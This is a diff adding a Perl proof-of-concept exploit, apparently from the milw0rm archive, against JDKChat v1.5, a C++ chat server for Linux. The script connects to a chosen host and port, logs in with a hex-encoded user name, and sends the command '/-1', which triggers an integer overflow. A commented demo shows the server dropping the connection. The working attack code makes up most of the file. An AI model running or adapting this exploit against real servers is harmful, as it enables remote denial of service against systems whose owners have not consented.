@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+#
+# Title: JDKChat v1.5 Remote Integer Overflow PoC
+#
+# Summary: JDKChat is a simple C++ chat server for GNU/Linux systems. 
+# Users can connect to it through a simple tcp client like telnet.
+#
+# WebSite : http://www.jdkoftinoff.com/	
+#
+# ---------------------------- Demo ---------------------------------
+# aleks@tux ~ $ telnet 192.168.0.1 7777
+# Trying 192.168.0.1...
+# Connected to 192.168.0.1.
+# Escape character is '^]'.
+# Welcome To jdkchat v1.5 by J.D. Koftinoff Software, Ltd.
+# http://www.jdkoftinoff.com/
+# and modified by Aditya Godbole (urwithaditya@gmx.net)
+# Commands available:
+#    /who  --  (list all users along with their connection numbers)
+#    /exit  -- (exit chat room)
+#    /local -- (toggle local mode for your telnet session)
+#    /[connection number] message -- (send private message to user at 
+#                                     specified connection number) 
+#
+#
+#    JDKCHAT: Aleks just entered the room.
+#    JDKCHAT: Users = Aleks:0 
+# Aleks >
+#
+#
+# // And after we run the PoC :
+#
+#    JDKCHAT: PwNzOr just entered the room.
+# Aleks >Connection closed by foreign host.
+# aleks@tux ~ $ 
+#
+# ---------------------------- /Demo --------------------------------
+# 
+# 
+# Vulnerability discovered by n3tpr0b3 & LiquidWorm
+#
+# n3tpr0b3 [AT] gmail [.] com
+#
+# 12.03.2009
+#
+
+use IO::Socket;
+
+if ($#ARGV != 1) {
+		print "
+		       JDKChat v1.5 Remote Integer Overflow PoC By n3tpr0b3
+		       =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+		       #        Usage : jdkchat_poc.pl SrvIP SrvPort      #
+		       #               Greetz to LiquidWorm               #
+		       =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n";
+		exit;
+}
+
+my $dupsa = new IO::Socket::INET (
+				PeerAddr => "$ARGV[0]",
+				PeerPort => "$ARGV[1]",
+				Proto => "tcp"
+		) 
+		or die "Could not connect to $ARGV[0]: $!\n";
+
+sleep 1;
+print $dupsa "\x50\x77\x4e\x7a\x4f\x72\x0d";
+print "#--> Loged on t3h JDKChat server...\n";
+sleep 1;
+print "#--> Sending our evil command...   \n";
+sleep 2;
+print $dupsa "\x2f\x2d\x31\x0d";
+close($dupsa);
+print "#--> Server pwned...               \n";
+
+# milw0rm.com [2009-03-12]
